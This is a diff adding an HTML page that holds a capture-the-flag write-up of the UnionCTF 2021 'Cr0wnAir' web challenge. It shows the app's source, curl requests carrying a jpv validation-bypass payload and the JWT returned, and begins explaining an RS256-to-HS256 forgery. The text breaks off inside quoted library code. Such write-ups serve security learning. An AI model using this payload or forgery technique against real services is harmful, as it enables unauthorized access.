@@ -1,0 +1,417 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[UnionCTF - 2021] Cr0wnAir // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.81.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[UnionCTF - 2021] Cr0wnAir"/>
+<meta name="twitter:description" content="UnionCTF - Cr0wnAir To solve this challenge, we had to exploit a vulnerability in jpv which allows us to bypass the regex validation in order to get a JWT. Then, we were able to change the algorithm from RS256 to HS256 and forge a new JWT with the public key, a key that we were able to retrieve thanks to a weak e.
+ The source code of the app is given, so let&rsquo;s take a look at it (only what will be interesting for us) :"/>
+
+    <meta property="og:title" content="[UnionCTF - 2021] Cr0wnAir" />
+<meta property="og:description" content="UnionCTF - Cr0wnAir To solve this challenge, we had to exploit a vulnerability in jpv which allows us to bypass the regex validation in order to get a JWT. Then, we were able to change the algorithm from RS256 to HS256 and forge a new JWT with the public key, a key that we were able to retrieve thanks to a weak e.
+ The source code of the app is given, so let&rsquo;s take a look at it (only what will be interesting for us) :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/writeup_cr0wnair/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-02-24T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-02-24T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/nasm_re" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[UnionCTF - 2021] Cr0wnAir</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Feb 24, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          8 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/ret2school/">ret2school</a>
+              <a class="tag" href="https://ret2school.github.io/tags/web/">web</a>
+              <a class="tag" href="https://ret2school.github.io/tags/jwt/">JWT</a>
+              <a class="tag" href="https://ret2school.github.io/tags/tek/">Tek</a>
+              <a class="tag" href="https://ret2school.github.io/tags/">Tags</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="unionctf---cr0wnair">UnionCTF - Cr0wnAir</h1>
+<p>To solve this challenge, we had to exploit a vulnerability in <code>jpv</code> which allows us to bypass the regex validation in order to get a JWT. Then, we were able to change the algorithm from <code>RS256</code> to <code>HS256</code> and forge a new JWT with the public key, a key that we were able to retrieve thanks to a weak <code>e</code>.</p>
+<hr>
+<p>The source code of the app is given, so let&rsquo;s take a look at it (only what will be interesting for us) :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<span style="color:#6272a4">// routes/checkin.js
+</span><span style="color:#6272a4"></span>
+<span style="color:#ff79c6">const</span> express <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;express&#39;</span>);
+<span style="color:#ff79c6">const</span> jpv <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;jpv&#34;</span>);
+<span style="color:#ff79c6">const</span> jwt <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;jwt-simple&#34;</span>);
+<span style="color:#ff79c6">const</span> path <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;path&#34;</span>);
+<span style="color:#ff79c6">const</span> router <span style="color:#ff79c6">=</span> express.Router();
+
+<span style="color:#ff79c6">const</span> config <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;../config&#39;</span>);
+
+<span style="color:#ff79c6">const</span> pattern <span style="color:#ff79c6">=</span> {
+  firstName<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^\w{1,30}$/</span>,
+  lastName<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^\w{1,30}$/</span>,
+  passport<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^[0-9]{9}$/</span>,
+  ffp<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^(|CA[0-9]{8})$/</span>,
+  extras<span style="color:#ff79c6">:</span> [
+    {sssr<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^(BULK|UMNR|VGML)$/</span>},
+  ],
+};
+
+<span style="color:#8be9fd;font-style:italic">function</span> isSpecialCustomer(passport, frequentFlyerNumber) {
+  <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>;
+}
+
+<span style="color:#8be9fd;font-style:italic">function</span> createToken(passport, frequentFlyerNumber) {
+  <span style="color:#8be9fd;font-style:italic">var</span> status <span style="color:#ff79c6">=</span> isSpecialCustomer(passport, frequentFlyerNumber) <span style="color:#ff79c6">?</span> <span style="color:#f1fa8c">&#34;gold&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;bronze&#34;</span>;
+  <span style="color:#8be9fd;font-style:italic">var</span> body <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;status&#34;</span><span style="color:#ff79c6">:</span> status, <span style="color:#f1fa8c">&#34;ffp&#34;</span><span style="color:#ff79c6">:</span> frequentFlyerNumber};
+  <span style="color:#ff79c6">return</span> jwt.encode(body, config.privkey, <span style="color:#f1fa8c">&#39;RS256&#39;</span>);
+}
+
+router.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+  res.sendFile(<span style="color:#f1fa8c">&#39;index.html&#39;</span>, { root<span style="color:#ff79c6">:</span> path.join(__dirname, <span style="color:#f1fa8c">&#39;../public&#39;</span>) });
+});
+
+router.post(<span style="color:#f1fa8c">&#39;/checkin&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>req.body) <span style="color:#ff79c6">return</span> res.sendStatus(<span style="color:#bd93f9">400</span>);
+  <span style="color:#8be9fd;font-style:italic">var</span> data <span style="color:#ff79c6">=</span> req.body;
+  
+  <span style="color:#ff79c6">if</span> (jpv.validate(data, pattern, { debug<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>, mode<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;strict&#34;</span> })) {
+    <span style="color:#ff79c6">if</span> (data[<span style="color:#f1fa8c">&#34;firstName&#34;</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;Tony&#34;</span> <span style="color:#ff79c6">&amp;&amp;</span> data[<span style="color:#f1fa8c">&#34;lastName&#34;</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;Abbott&#34;</span>) {
+      <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You have successfully checked in! Please remember not to post your boarding pass on social media.&#34;</span>};
+    } <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (data[<span style="color:#f1fa8c">&#34;ffp&#34;</span>]) {
+      <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer.&#34;</span>};
+      <span style="color:#ff79c6">for</span>(e <span style="color:#ff79c6">in</span> data[<span style="color:#f1fa8c">&#34;extras&#34;</span>]) {
+        <span style="color:#ff79c6">if</span> (data[<span style="color:#f1fa8c">&#34;extras&#34;</span>][e][<span style="color:#f1fa8c">&#34;sssr&#34;</span>] <span style="color:#ff79c6">&amp;&amp;</span> data[<span style="color:#f1fa8c">&#34;extras&#34;</span>][e][<span style="color:#f1fa8c">&#34;sssr&#34;</span>] <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;FQTU&#34;</span>) {
+          <span style="color:#8be9fd;font-style:italic">var</span> token <span style="color:#ff79c6">=</span> createToken(data[<span style="color:#f1fa8c">&#34;passport&#34;</span>], data[<span style="color:#f1fa8c">&#34;ffp&#34;</span>]);
+          <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&#34;</span>, <span style="color:#f1fa8c">&#34;token&#34;</span><span style="color:#ff79c6">:</span> token};
+        }
+      }
+    } <span style="color:#ff79c6">else</span> {
+      <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You have successfully checked in!&#34;</span>};
+    }
+  } <span style="color:#ff79c6">else</span> {
+    <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Invalid checkin data provided, please try again.&#34;</span>};
+  }
+
+  res.json(response);
+});
+
+module.exports <span style="color:#ff79c6">=</span> router;
+
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<span style="color:#6272a4">// routes/upgrades.js
+</span><span style="color:#6272a4"></span>
+<span style="color:#ff79c6">const</span> express <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;express&#39;</span>);
+<span style="color:#ff79c6">const</span> jpv <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;jpv&#34;</span>);
+<span style="color:#ff79c6">const</span> jwt <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;jwt-simple&#34;</span>);
+<span style="color:#ff79c6">const</span> path <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;path&#34;</span>);
+<span style="color:#ff79c6">const</span> router <span style="color:#ff79c6">=</span> express.Router();
+
+<span style="color:#ff79c6">const</span> config <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;../config&#39;</span>);
+
+<span style="color:#8be9fd;font-style:italic">function</span> getLoyaltyStatus(req, res, next) {
+  <span style="color:#ff79c6">if</span> (req.headers.authorization) {
+    <span style="color:#8be9fd;font-style:italic">let</span> token <span style="color:#ff79c6">=</span> req.headers.authorization.split(<span style="color:#f1fa8c">&#34; &#34;</span>)[<span style="color:#bd93f9">1</span>];
+    <span style="color:#ff79c6">try</span> {
+      <span style="color:#8be9fd;font-style:italic">var</span> decoded <span style="color:#ff79c6">=</span> jwt.decode(token, config.pubkey);
+    } <span style="color:#ff79c6">catch</span> {
+      <span style="color:#ff79c6">return</span> res.json({ msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;Token is not valid.&#39;</span> });
+    }
+    res.locals.token <span style="color:#ff79c6">=</span> decoded;
+  }
+  next()
+}
+
+router.get(<span style="color:#f1fa8c">&#39;/&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+  res.sendFile(<span style="color:#f1fa8c">&#39;upgrades.html&#39;</span>, { root<span style="color:#ff79c6">:</span> path.join(__dirname, <span style="color:#f1fa8c">&#39;../public&#39;</span>) });
+});
+
+router.post(<span style="color:#f1fa8c">&#39;/legroom&#39;</span>, [getLoyaltyStatus], <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+  <span style="color:#ff79c6">if</span> (res.locals.token <span style="color:#ff79c6">&amp;&amp;</span> [<span style="color:#f1fa8c">&#34;bronze&#34;</span>, <span style="color:#f1fa8c">&#34;silver&#34;</span>, <span style="color:#f1fa8c">&#34;gold&#34;</span>].includes(res.locals.token.status)) {
+    <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Upgrade successfully selected&#34;</span>};
+  } <span style="color:#ff79c6">else</span> {
+    <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You do not qualify for this upgrade at this time. Please fly with us more.&#34;</span>};
+  }
+  res.json(response);
+});
+
+router.post(<span style="color:#f1fa8c">&#39;/toilets&#39;</span>, [getLoyaltyStatus], <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+  <span style="color:#ff79c6">if</span> (res.locals.token <span style="color:#ff79c6">&amp;&amp;</span> [<span style="color:#f1fa8c">&#34;bronze&#34;</span>, <span style="color:#f1fa8c">&#34;silver&#34;</span>, <span style="color:#f1fa8c">&#34;gold&#34;</span>].includes(res.locals.token.status)) {
+    <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Upgrade successfully selected&#34;</span>};
+  } <span style="color:#ff79c6">else</span> {
+    <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You do not qualify for this upgrade at this time. Please fly with us more.&#34;</span>};
+  }
+  res.json(response);
+});
+
+router.post(<span style="color:#f1fa8c">&#39;/flag&#39;</span>, [getLoyaltyStatus], <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+  <span style="color:#ff79c6">if</span> (res.locals.token <span style="color:#ff79c6">&amp;&amp;</span> res.locals.token.status <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;gold&#34;</span>) {
+    <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> config.flag };
+  } <span style="color:#ff79c6">else</span> {
+    <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You do not qualify for this upgrade at this time. Please fly with us more.&#34;</span>};
+  }
+  res.json(response);
+});
+
+module.exports <span style="color:#ff79c6">=</span> router;
+</code></pre></div><p>After the analysis of the source code, we can notice an interesting path : we need to set <code>sssr</code> to <code>FQTU</code> to receive our JWT. And with this JWT, if the <code>status</code> is set to <code>gold</code>, we get the flag.
+However, the data we send to <code>/checkin</code> must check some regex :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#ff79c6">const</span> pattern <span style="color:#ff79c6">=</span> {
+  firstName<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^\w{1,30}$/</span>,
+  lastName<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^\w{1,30}$/</span>,
+  passport<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^[0-9]{9}$/</span>,
+  ffp<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^(|CA[0-9]{8})$/</span>,
+  extras<span style="color:#ff79c6">:</span> [
+    {sssr<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^(BULK|UMNR|VGML)$/</span>},
+  ],
+};
+
+[...]
+
+router.post(<span style="color:#f1fa8c">&#39;/checkin&#39;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(req, res, next) {
+
+  [...]
+
+  <span style="color:#ff79c6">if</span> (jpv.validate(data, pattern, { debug<span style="color:#ff79c6">:</span> <span style="color:#ff79c6">true</span>, mode<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;strict&#34;</span> })) {
+
+      [...]
+
+      <span style="color:#ff79c6">for</span>(e <span style="color:#ff79c6">in</span> data[<span style="color:#f1fa8c">&#34;extras&#34;</span>]) {
+        <span style="color:#ff79c6">if</span> (data[<span style="color:#f1fa8c">&#34;extras&#34;</span>][e][<span style="color:#f1fa8c">&#34;sssr&#34;</span>] <span style="color:#ff79c6">&amp;&amp;</span> data[<span style="color:#f1fa8c">&#34;extras&#34;</span>][e][<span style="color:#f1fa8c">&#34;sssr&#34;</span>] <span style="color:#ff79c6">===</span> <span style="color:#f1fa8c">&#34;FQTU&#34;</span>) {
+          <span style="color:#8be9fd;font-style:italic">var</span> token <span style="color:#ff79c6">=</span> createToken(data[<span style="color:#f1fa8c">&#34;passport&#34;</span>], data[<span style="color:#f1fa8c">&#34;ffp&#34;</span>]);
+          <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&#34;</span>, <span style="color:#f1fa8c">&#34;token&#34;</span><span style="color:#ff79c6">:</span> token};
+        }
+      }
+    } <span style="color:#ff79c6">else</span> {
+      <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You have successfully checked in!&#34;</span>};
+    }
+  } <span style="color:#ff79c6">else</span> {
+    <span style="color:#8be9fd;font-style:italic">var</span> response <span style="color:#ff79c6">=</span> {msg<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Invalid checkin data provided, please try again.&#34;</span>};
+  }
+
+  res.json(response);
+});
+
+</code></pre></div><p>Indeed, if we try what we said (i.e. set <code>sssr</code> to <code>FQTU</code>) it will not be accepted by the regex and we will not get our JWT :( :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+$ curl <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/checkin&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> --data-raw <span style="color:#f1fa8c">&#39;{&#34;firstName&#34;:&#34;tytyr&#34;,&#34;lastName&#34;:&#34;rtyry&#34;,&#34;passport&#34;:&#34;123456789&#34;,&#34;ffp&#34;:&#34;CA12345678&#34;,&#34;extras&#34;:[{&#34;sssr&#34;:&#34;FQTU&#34;}]}&#39;</span>
+<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;Invalid checkin data provided, please try again.&#34;</span><span style="color:#ff79c6">}</span>
+
+</code></pre></div><p>After a careful rereading, we did not notice any bug in the app ; so maybe some libraries (<code>jpv</code> and <code>jwt-simple</code>, to match our path) are vulnerable.
+The answer is yes ! If we check the version of <code>jpv</code> we see that it is an old version released 2 years ago. Moreover, on the github of <code>jpv</code> there are some validation bypasses.
+<a href="https://github.com/manvel-khnkoyan/jpv/issues/6">This issue</a> will help us :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<span style="color:#f1fa8c">&#34;use strict&#34;</span>;
+
+<span style="color:#8be9fd;font-style:italic">var</span> jpv <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;jpv&#39;</span>);
+<span style="color:#8be9fd;font-style:italic">var</span> path <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;path&#39;</span>);
+<span style="color:#8be9fd;font-style:italic">var</span> utils <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;../TestcaseUtils.js&#34;</span>);
+
+<span style="color:#8be9fd;font-style:italic">var</span> user_input <span style="color:#ff79c6">=</span> {
+    should_be_arrary<span style="color:#ff79c6">:</span> {<span style="color:#f1fa8c">&#34;a&#34;</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">&#39;constructor&#39;</span><span style="color:#ff79c6">:</span> {<span style="color:#f1fa8c">&#39;name&#39;</span><span style="color:#ff79c6">:</span><span style="color:#f1fa8c">&#39;Array&#39;</span>}}
+};
+<span style="color:#8be9fd;font-style:italic">var</span> pattern <span style="color:#ff79c6">=</span> {
+    should_be_arrary<span style="color:#ff79c6">:</span> []
+};
+
+console.log(jpv.validate(user_input, pattern));
+
+</code></pre></div><p>It is said that we can bypass the validation when the pattern expect an array. So let&rsquo;s try that :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+$ curl <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/checkin&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> --data-raw <span style="color:#f1fa8c">&#39;{&#34;firstName&#34;:&#34;aa&#34;,&#34;lastName&#34;:&#34;aaa&#34;,&#34;passport&#34;:&#34;123456789&#34;,&#34;ffp&#34;:&#34;CA12345678&#34;,&#34;extras&#34;:{&#34;a&#34;:{&#34;sssr&#34;:&#34;FQTU&#34;}, &#34;constructor&#34;:{&#34;name&#34;:&#34;Array&#34;}}}&#39;</span>
+<span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&#34;</span>,<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg&#34;</span><span style="color:#ff79c6">}</span>%
+
+</code></pre></div><p>Nice ! We now have our JWT.
+If we remember the source code, the application decodes our JWT without specifying the algorithm. Thanks to this mistake and the absence of verification by the library, we can change the algorithm specified in our JWT from <code>RS256</code> (asymetric) to <code>HS256</code> (symetric algorithm) and the app will try to decode our JWT with the public key and the <code>HS256</code> algorithm :</p>
+<p>the lines where the app encodes/decodes JWT :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+jwt.encode(body, config.privkey, <span style="color:#f1fa8c">&#39;RS256&#39;</span>);
+[...]
+jwt.decode(token, config.pubkey);
+
+</code></pre></div><p>and the library <a href="https://github.com/hokaccha/node-jwt-simple/blob/v0.5.1/lib/jwt.js#L58">source code</a> :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<span style="color:#6272a4">/**
+</span><span style="color:#6272a4"> * support algorithm mapping
+</span><span style="color:#6272a4"> */</span>
+<span style="color:#8be9fd;font-style:italic">var</span> algorithmMap <span style="color:#ff79c6">=</span> {
+  HS256<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;sha256&#39;</span>,
+  HS384<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;sha384&#39;</span>,
+  HS512<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;sha512&#39;</span>,
+  RS256<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;RSA-SHA256&#39;</span>
+};
+
+<span style="color:#6272a4">/**
+</span><span style="color:#6272a4"> * Map algorithm to hmac or sign type, to determine which crypto function to use
+</span><span style="color:#6272a4"> */</span>
+<span style="color:#8be9fd;font-style:italic">var</span> typeMap <span style="color:#ff79c6">=</span> {
+  HS256<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;hmac&#39;</span>,
+  HS384<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;hmac&#39;</span>,
+  HS512<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;hmac&#39;</span>,
+  RS256<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#39;sign&#39;</span>
+};
+
+jwt.decode <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span> jwt_decode(token, key, noVerify, algorithm) {
+  <span style="color:#6272a4">// check token
+</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>token) {
+    <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Error</span>(<span style="color:#f1fa8c">&#39;No token supplied&#39;</span>);
+  }
+  <span style="color:#6272a4">// check segments
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd;font-style:italic">var</span> segments <span style="color:#ff79c6">=</span> token.split(<span style="color:#f1fa8c">&#39;.&#39;</span>);
+  <span style="color:#ff79c6">if</span> (segments.length <span style="color:#ff79c6">!==</span> <span style="color:#bd93f9">3</span>) {
+    <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd;font-style:italic">Error</span>(<span style="color:#f1fa8c">&#39;Not enough or too many segments&#39;</span>);
+  }
+
+  <span style="color:#6272a4">// All segment should be base64
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd;font-style:italic">var</span> headerSeg <span style="color:#ff79c6">=</span> segments[<span style="color:#bd93f9">0</span>];
+  <span style="color:#8be9fd;font-style:italic">var</span> payloadSeg <span style="color:#ff79c6">=</span> segments[<span style="color:#bd93f9">1</span>];
+  <span style="color:#8be9fd;font-style:italic">var</span> signatureSeg <span style="color:#ff79c6">=</span> segments[<span style="color:#bd93f9">2</span>];
+
+  <span style="color:#6272a4">// base64 decode and parse JSON
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd;font-style:italic">var</span> header <span style="color:#ff79c6">=</span> JSON.parse(base64urlDecode(headerSeg));
+  <span style="color:#8be9fd;font-style:italic">var</span> payload <span style="color:#ff79c6">=</span> JSON.parse(base64urlDecode(payloadSeg));
+
